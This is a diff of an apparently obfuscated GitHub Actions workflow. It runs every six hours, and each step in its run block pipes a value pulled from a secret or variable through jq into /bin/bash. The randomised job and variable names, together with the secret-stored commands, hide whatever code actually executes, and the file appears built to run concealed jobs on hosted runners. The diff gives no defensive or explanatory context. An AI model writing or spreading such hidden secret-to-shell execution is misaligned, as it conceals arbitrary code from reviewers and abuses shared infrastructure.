@@ -2,29 +2,19 @@ name: zhanxugang9871
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 0/6 * * *'
+    - cron: '13 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhanxugang9871
         env:
-          fnfk11792: ${{ secrets.fnfk11792 }}
+          w61786: ${{ secrets.w61786 }}
         run: |
-          echo $fnfk11792 | jq -r .foy03352 | /bin/bash
-          echo $obhw8 | jq -r .il21 | /bin/bash
-          echo $uhiiy9 | jq -r .fjet3187 | /bin/bash
-          echo $hpv57 | jq -r .jxm0 | /bin/bash
-          echo $rvw74756 | jq -r .asd1773 | /bin/bash
-          echo $gb823 | jq -r .l9352 | /bin/bash
-          echo $zmhzz749 | jq -r .jyty6774 | /bin/bash
-          echo $ck18 | jq -r .znwnh9 | /bin/bash
-          echo $jx4755 | jq -r .pc06 | /bin/bash
-          echo $uwcnf7 | jq -r .abum37 | /bin/bash
-          echo $hpg9 | jq -r .ywga94529 | /bin/bash
-          echo $aa20339 | jq -r .rv1772 | /bin/bash
-          echo $va9842 | jq -r .pedqg1922 | /bin/bash
-          echo $gk60 | jq -r .d316 | /bin/bash
+          echo $w61786 | jq -r .cbob34197 | /bin/bash
+          echo $k60 | jq -r .fzm6 | /bin/bash
+          echo $suode9 | jq -r .maka15171 | /bin/bash
+          echo $ewrs82884 | jq -r .ie88048 | /bin/bash
 
